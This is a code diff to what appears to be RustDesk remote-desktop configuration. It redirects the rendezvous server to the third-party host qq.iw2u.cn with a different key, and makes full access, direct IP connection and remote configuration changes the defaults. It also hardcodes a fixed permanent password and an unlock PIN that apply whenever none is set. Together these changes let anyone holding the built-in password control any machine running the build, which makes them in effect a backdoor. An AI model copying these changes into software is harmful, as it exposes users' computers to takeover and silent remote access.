@@ -156,8 +156,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["qq.iw2u.cn"];
+pub const RS_PUB_KEY: &str = "vLS6F7hufPabK4mbDPyGMBbn+Y3vexV66BEO+0kuRYU=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -509,6 +509,49 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+        
+        // 默认完全访问
+        if !config.options.contains_key("access-mode") {
+            config.options.insert("access-mode".to_string(), "full".to_string());
+            store = true;
+        }
+        
+        // 默认启用允许IP直连
+        if !config.options.contains_key("direct-server") {
+            config.options.insert("direct-server".to_string(), "Y".to_string());
+            store = true;
+        }
+        
+        // 默认启用允许远程修改配置
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
+        
+        // 默认开启 IPv6 P2P 连接
+        if !config.options.contains_key("enable-ipv6-punch") {
+            config.options.insert("enable-ipv6-punch".to_string(), "Y".to_string());
+            store = true;
+        }
+        
+        // 默认开启真彩 4:4:4
+        if !config.options.contains_key("i444") {
+            config.options.insert("i444".to_string(), "Y".to_string());
+            store = true;
+        }
+        
+        // 默认启用PIN码解锁设置
+        if config.unlock_pin.is_empty() {
+            config.unlock_pin = "00yGxF4dWiDC4tSxYsBkxeTBlep9t8og==".to_string();
+            store = true;
+        }
+        
+        // 默认两种密码
+         if !config.options.contains_key("verification-method") {
+             config.options.insert("verification-method".to_string(), "use-both-passwords".to_string());
+             store = true;
+        }
+        
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -614,6 +657,13 @@ impl Config {
     fn load() -> Config {
         let mut config = Config::load_::<Config>("");
         let mut store = false;
+    
+    // 内置固定密码
+    if config.password.is_empty() {
+        config.password = "116428@Rd".to_string();
+        store = true;
+    }
+    
         store |= Self::migrate_permanent_password_to_hashed_storage(&mut config);
         let mut id_valid = false;
         let (id, encrypted, store2) = decrypt_str_or_original(&config.enc_id, PASSWORD_ENC_VERSION);
